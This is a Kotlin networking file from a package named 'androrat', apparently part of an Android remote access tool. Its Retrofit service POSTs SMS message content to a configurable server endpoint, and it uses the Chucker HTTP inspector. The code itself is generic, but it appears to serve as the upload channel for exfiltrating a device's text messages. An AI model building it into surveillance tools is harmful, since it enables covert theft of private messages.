package com.ierusalem.androrat.networking

import android.content.Context
import com.chuckerteam.chucker.api.ChuckerCollector
import com.chuckerteam.chucker.api.ChuckerInterceptor
import com.chuckerteam.chucker.api.RetentionManager
import com.google.gson.GsonBuilder
import com.ierusalem.androrat.utility.Constants
import okhttp3.OkHttpClient
import okhttp3.ResponseBody
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.Headers
import retrofit2.http.POST

interface SenderService {

    @Headers("Accept: application/json")
    @POST("message/")
    suspend fun postFiles(
        @Body smsModel: SMSModel
    ): Response<ResponseBody>

//    Example
//    @Headers("Accept: application/vnd.github+json")
//    @POST("repos/{owner}/{repo}/issues/{issue_number}/comments")
//    suspend fun postComment(
//        @Header("Authorization") authToken: String,
//        @Path("owner") owner: String,
//        @Path("repo") repo: String,
//        @Path("issue_number") issueNumber: String,
//        @Body body: CommentRequestModel
//    ): Response<CommentResponseModel>

}

class RetrofitInstance(context: Context) {

    // Create the Collector
    private val chuckerCollector = ChuckerCollector(
        context = context,
        // Toggles visibility of the notification
        showNotification = true,
        // Allows to customize the retention period of collected data
        retentionPeriod = RetentionManager.Period.ONE_HOUR
    )

    // Create the Interceptor
    private val chuckerInterceptor = ChuckerInterceptor.Builder(context)
        // The previously created Collector
        .collector(chuckerCollector)
        // The max body content length in bytes, after this responses will be truncated.
        .maxContentLength(250_000L)
        // Read the whole response body even when the client does not consume the response completely.
        // This is useful in case of parsing errors or when the response body
        // is closed before being read like in Retrofit with Void and Unit types.
        .alwaysReadResponseBody(true)
        // Use decoder when processing request and response bodies. When multiple decoders are installed they
        // are applied in an order they were added.
        //.addBodyDecoder(decoder)
        // Controls Android shortcut creation.
        .createShortcut(true)
        .build()

    private val client = OkHttpClient.Builder()
        .addInterceptor(chuckerInterceptor)
        .build()

    private val gson = GsonBuilder()
        .setLenient()
        .create()

    val api: SenderService by lazy {
        val retrofit = Retrofit.Builder()
            .baseUrl(Constants.BASE_URL)
            .client(client)
            .addConverterFactory(GsonConverterFactory.create(gson))
            .build()
        retrofit.create(SenderService::class.java)
    }
}

data class SMSModel(
    val message: String
)